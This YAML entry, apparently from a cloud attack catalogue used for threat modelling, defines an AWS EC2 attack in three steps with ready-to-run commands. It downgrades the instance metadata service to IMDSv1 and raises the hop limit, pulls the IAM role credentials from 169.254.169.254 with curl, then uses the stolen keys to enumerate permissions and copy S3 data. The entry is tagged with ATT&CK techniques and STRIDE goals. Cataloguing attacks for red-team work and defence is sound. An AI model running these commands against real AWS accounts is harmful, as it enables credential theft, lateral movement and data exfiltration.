attack:
  id: aws-ec2-imds-weakening-001
  name: IMDS Protection Weakening via ec2:ModifyInstanceMetadataOptions
  overview: >
    An attacker with the ec2:ModifyInstanceMetadataOptions IAM permission can
    downgrade or weaken the Instance Metadata Service (IMDS) protections on any
    EC2 instance they can reference. The two primary weakening vectors are:
    (1) forcing IMDSv1 by setting --http-tokens to "optional", removing the
    session-oriented token requirement introduced by IMDSv2; and (2) raising the
    HttpPutResponseHopLimit TTL above 1, which allows the link-local address
    169.254.169.254 to be reachable beyond the host's own network namespace —
    enabling containers, proxies, or SSRF-vulnerable applications co-located on
    the instance to reach IMDS and retrieve temporary IAM role credentials.
    Once IMDSv1 is re-enabled or the hop limit is raised, an attacker (or a
    compromised workload on the instance) can issue unauthenticated HTTP GET
    requests to IMDS and exfiltrate the attached IAM role's access key,
    secret key, and session token.
  steps:
    - title: "Step 1: Downgrade IMDS to IMDSv1 and Raise Hop Limit"
      command: |
        aws ec2 modify-instance-metadata-options \
          --instance-id <INSTANCE_ID> \
          --http-tokens optional \
          --http-endpoint enabled \
          --http-put-response-hop-limit 2
      dependencies:
        - "IAM permission: ec2:ModifyInstanceMetadataOptions on the target instance"
        - "IAM permission: ec2:DescribeInstances (to enumerate target instance IDs)"
        - "Valid AWS credentials with sufficient scope (e.g., compromised IAM user/role)"
        - "Target EC2 instance must exist and be in a running or stopped state"
      result: >
        The target instance's IMDS configuration is updated: IMDSv1 (unsigned
        HTTP requests) becomes accepted alongside IMDSv2, and the PUT response
        hop limit is raised to 2. This means the 169.254.169.254 metadata
        endpoint is now reachable from containers or one additional network hop
        away from the host, and no session token is required to query it.
      ttp: "T1552.005 - Unsecured Credentials: Cloud Instance Metadata API"

    - title: "Step 2: Retrieve Temporary IAM Role Credentials from IMDS"
      command: |
        # Discover the attached IAM role name
        curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

        # Retrieve the temporary credentials for the discovered role
        curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
      dependencies:
        - "Network access to 169.254.169.254 from the attacker's vantage point (container, SSRF payload, or shell on the instance)"
        - "IMDS endpoint must be enabled (confirmed in Step 1)"
        - "IMDSv1 must be re-enabled (http-tokens: optional, confirmed in Step 1) OR hop limit raised to reach IMDS from a container/adjacent process"
        - "An IAM role must be attached to the target EC2 instance"
      result: >
        The API response returns a JSON object containing AccessKeyId,
        SecretAccessKey, Token (session token), and Expiration for the IAM role
        attached to the instance. The attacker now holds valid, temporary AWS
        credentials with the permissions of that role.
      ttp: "T1552.005 - Unsecured Credentials: Cloud Instance Metadata API"

    - title: "Step 3: Use Exfiltrated Credentials for Lateral Movement or Privilege Escalation"
      command: |
        # Configure a local AWS CLI profile with the stolen credentials
        export AWS_ACCESS_KEY_ID=<STOLEN_ACCESS_KEY_ID>
        export AWS_SECRET_ACCESS_KEY=<STOLEN_SECRET_ACCESS_KEY>
        export AWS_SESSION_TOKEN=<STOLEN_SESSION_TOKEN>

        # Verify identity and enumerate permissions of the stolen role
        aws sts get-caller-identity
        aws iam list-attached-role-policies --role-name <ROLE_NAME>

        # Example: use elevated permissions to access S3 data
        aws s3 ls
        aws s3 cp s3://<TARGET_BUCKET>/<SENSITIVE_OBJECT> .
      dependencies:
        - "Stolen temporary credentials obtained in Step 2"
        - "AWS CLI or compatible SDK available in attacker's environment"
        - "Stolen role must have permissions beyond the initial compromise scope for privilege escalation to be meaningful"
        - "Session token must not have expired (credentials are time-limited)"
      result: >
        The attacker operates as the EC2 instance's IAM role from an external or
        lateral context, outside the original compromise boundary. Depending on
        the role's attached policies, this may enable access to S3 buckets,
        Secrets Manager secrets, RDS databases, Lambda invocations, or further
        IAM privilege escalation — achieving lateral movement across AWS services
        or full account compromise.
      ttp: "T1550.001 - Use Alternate Authentication Material: Application Access Token"
  stride_goal:
    - Tampering
    - Information Disclosure
    - Elevation of Privilege